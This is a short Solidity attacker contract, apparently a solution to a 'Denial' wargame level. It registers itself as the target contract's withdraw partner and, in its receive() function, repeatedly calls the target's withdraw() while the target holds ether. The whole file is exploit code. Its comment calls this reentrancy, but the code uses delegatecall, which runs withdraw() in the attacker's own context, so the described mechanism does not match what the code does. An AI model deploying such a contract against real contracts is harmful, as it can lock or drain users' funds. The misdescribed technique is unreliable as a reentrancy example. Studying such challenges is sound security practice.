pragma solidity ^0.8.0;

contract AttackerDenial {
    address public denialInstance;

    constructor(address payable _denialInstance) {
        denialInstance = _denialInstance;
    }

    receive() external payable {
        if (address(denialInstance).balance > 0) {
            // Reentrancy attack: recursively call withdraw until contract balance is 0
            (bool success, ) = denialInstance.delegatecall(abi.encodeWithSignature("withdraw()"));
            require(success, "Reentrancy call failed");
        }
    }

    function setPartner() external {
        (bool success, ) = denialInstance.call(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
        require(success, "Failed to set partner");
    }
}
